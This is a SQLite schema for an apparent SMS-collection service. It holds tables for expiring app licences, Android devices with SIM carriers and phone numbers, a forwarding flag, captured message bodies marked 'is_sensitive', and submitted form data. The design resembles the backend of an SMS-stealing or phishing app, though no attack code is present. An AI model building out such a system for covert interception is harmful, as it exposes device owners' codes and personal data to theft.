CREATE TABLE IF NOT EXISTS apps (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  app_id TEXT UNIQUE NOT NULL,
  name TEXT NOT NULL,
  pin TEXT NOT NULL,
  status TEXT DEFAULT 'active',
  created_at TEXT NOT NULL,
  expires_at TEXT NOT NULL
);

CREATE TABLE IF NOT EXISTS devices (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  app_id TEXT NOT NULL,
  device_id TEXT NOT NULL,
  user_id TEXT,
  name TEXT,
  android_version INTEGER,
  sim1_carrier TEXT,
  sim1_phone TEXT,
  sim2_carrier TEXT,
  sim2_phone TEXT,
  fcm_token TEXT,
  status TEXT,
  last_online TEXT,
  forward_enabled INTEGER DEFAULT 0,
  installed_at TEXT,
  updated_at TEXT,
  UNIQUE(app_id, device_id)
);

CREATE TABLE IF NOT EXISTS messages (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  app_id TEXT NOT NULL,
  device_id TEXT NOT NULL,
  user_id TEXT,
  from_sender TEXT,
  from_number TEXT,
  body TEXT,
  is_sensitive INTEGER DEFAULT 0,
  received_at TEXT NOT NULL
);

CREATE TABLE IF NOT EXISTS form_data (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  app_id TEXT NOT NULL,
  device_id TEXT NOT NULL,
  data TEXT NOT NULL,
  submitted_at TEXT NOT NULL
);

CREATE TABLE IF NOT EXISTS sessions (
  id TEXT PRIMARY KEY,
  login_time TEXT NOT NULL,
  last_active TEXT NOT NULL,
  user_agent TEXT,
  ip TEXT,
  device TEXT
);